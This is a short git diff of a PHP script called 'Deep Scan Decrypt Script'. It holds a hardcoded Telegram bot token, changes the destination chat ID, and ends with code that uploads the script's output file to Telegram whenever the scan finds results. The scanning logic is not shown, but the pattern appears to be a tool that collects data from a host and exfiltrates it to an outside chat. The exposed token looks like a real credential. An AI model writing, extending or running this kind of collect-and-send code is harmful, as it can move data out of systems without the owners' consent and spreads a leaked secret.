@@ -14,7 +14,7 @@ echo "Starting Deep Scan Decrypt Script...\n";
 // CONFIGURATION
 // ============================================
 $tg_bot_token = '8434935750:AAEzRdUUXxQWlLosrbLmVgYNMN--8anMzNQ';
-$tg_chat_id = '905804849';
+$tg_chat_id = '-5057844746';
 
 // ============================================
 // TELEGRAM FUNCTION (TEXT & FILE)
@@ -383,3 +383,4 @@ if ($found_count > 0 && $tg_bot_token !== 'ENTER_BOT_TOKEN_HERE') {
     send_telegram(null, $outFile);
 }
 ?>
+
